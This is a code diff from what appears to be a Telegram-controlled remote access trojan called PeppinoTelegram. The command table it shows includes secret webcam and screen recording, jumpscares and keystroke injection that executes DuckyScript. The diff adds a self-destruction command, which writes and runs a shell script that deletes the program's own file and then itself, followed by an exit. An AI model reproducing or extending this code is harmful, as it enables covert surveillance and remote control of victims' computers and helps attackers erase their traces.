@@ -729,6 +729,7 @@ class PeppinoTelegram:
                 "displaymode":self.display_mode,
                 "jumpscarenoaudio":self.jumpscarenoaudio,
                 "fullclip":self.record_webcam_and_screen,
+                "selfdestruction":self.selfdestruction,
                 "duckyhelp":lambda: self.bsend(self.duckyhelp),
                 "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
                 "capslock": lambda: toducky("CAPSLOCK", execute=True),
@@ -1545,6 +1546,7 @@ class PeppinoTelegram:
                     f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                 chmod(sh_file, 0o700)
                 Popen(['sh', sh_file])                                                                                                       
+            sys.exit()
 
         def waitforface(self, timeout=60):
             start = time()
